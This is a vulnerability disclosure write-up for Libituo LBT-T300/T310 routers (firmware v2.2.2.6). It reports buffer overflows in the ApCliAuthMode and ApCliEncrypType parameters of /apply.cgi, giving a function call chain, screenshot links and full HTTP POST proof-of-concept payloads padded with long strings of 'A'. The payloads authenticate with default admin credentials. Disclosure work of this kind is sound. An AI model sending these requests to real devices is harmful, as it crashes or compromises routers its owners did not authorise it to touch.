# LBT-T310 Buffer Overflow
**Vulnerability description**
Shenzhen Libituo Technology Co., Ltd LBT-T300-T310 v2.2.2.6 was discovered to contain a buffer overflow via multiple  parameters at /apply.cgi.

## 1.ApCliAuthMode

### Vulnerability analysis
Due to the lack of data length restrictions of the ApCliAuthMode parameter, a buffer overflow vulnerability is created.

function call chain

Main()->sub_40BEC8()->start_single_service()->start_workmode()->start_lan()->start_wlan()->config_wlan()->generate_conf()->generate_conf_router()->updateCurAPlist()->makeCurRemoteApList ().
![在这里插入图片描述](https://img-blog.csdnimg.cn/e5860fcd7934499a8682a15e826b797e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/4610d34c5a3e4a33ac5f636999476fe0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/183c41b8e5b548d6bbacd5ca9f1b3554.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/def3469bfe73490685f78cf760c10297.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a8ba62a4e5544940b2549fa8e6b1bd7a.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/124334394a244e4fb743a02b39bc38f0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5be9ceedeb1147aa845856fded4628a9.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b840a93b51b6481ab3253a9ebd8bf232.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b589d5287c0e489c8e28b863269a9eaf.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e033574277f4196a07307376d75f9a6.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/79fb883d8bd14b2396224c17171e1208.png)


> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 697
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/apclient_scan.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=apclient_scan&change_action=&wan_proto=9&action=Apply&wan_dns_enable=1&ApCliEnable=1&ApCliBssid=&ApCliChannel=6&ApClientBridgeEnable=1&wr_ApClientBridgeEnable=on&ApCliSsid=Remote_AP_SSID&ApCliAuthMode=OPENAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ApCliEncrypType=NONE&ApCli_wl_wep_len=0&ApCliDefaultKeyID=1&ApCliKey1Type=0&ApCliKey1Str=**********&ApCliKey2Type=0&ApCliKey2Str=**********&ApCliKey3Type=0&ApCliKey3Str=**********&ApCliKey4Type=0&ApCliKey4Str=**********&ApCliWPAEncrypType=TKIP&ApCliWPAPSK=12345678

```

## 2.ApCliEncrypType
### Vulnerability analysis
Due to the lack of data length restrictions of the ApCliEncrypType parameter, a buffer overflow vulnerability is created.

function call chain

Main()->sub_40BEC8()->start_single_service()->start_workmode()->start_lan()->start_wlan()->config_wlan()->generate_conf()->generate_conf_router()->updateCurAPlist()->makeCurRemoteApList ().
![在这里插入图片描述](https://img-blog.csdnimg.cn/8316e2625c1b41d3a8dee38af221a239.png

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b3fc42eb40440bf94d969296e821661.jpeg)
![在这里插入图片描述](https://img-blog.csdnimg.cn/4610d34c5a3e4a33ac5f636999476fe0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/183c41b8e5b548d6bbacd5ca9f1b3554.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/def3469bfe73490685f78cf760c10297.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a8ba62a4e5544940b2549fa8e6b1bd7a.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/124334394a244e4fb743a02b39bc38f0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/5be9ceedeb1147aa845856fded4628a9.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b840a93b51b6481ab3253a9ebd8bf232.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b589d5287c0e489c8e28b863269a9eaf.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e033574277f4196a07307376d75f9a6.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/79fb883d8bd14b2396224c17171e1208.png)


> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 697
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/apclient_scan.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=apclient_scan&change_action=&wan_proto=9&action=Apply&wan_dns_enable=1&ApCliEnable=1&ApCliBssid=&ApCliChannel=6&ApClientBridgeEnable=1&wr_ApClientBridgeEnable=on&ApCliSsid=Remote_AP_SSID&ApCliAuthMode=OPEN&ApCliEncrypType=NONEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ApCli_wl_wep_len=0&ApCliDefaultKeyID=1&ApCliKey1Type=0&ApCliKey1Str=**********&ApCliKey2Type=0&ApCliKey2Str=**********&ApCliKey3Type=0&ApCliKey3Str=**********&ApCliKey4Type=0&ApCliKey4Str=**********&ApCliWPAEncrypType=TKIP&ApCliWPAPSK=12345678

```
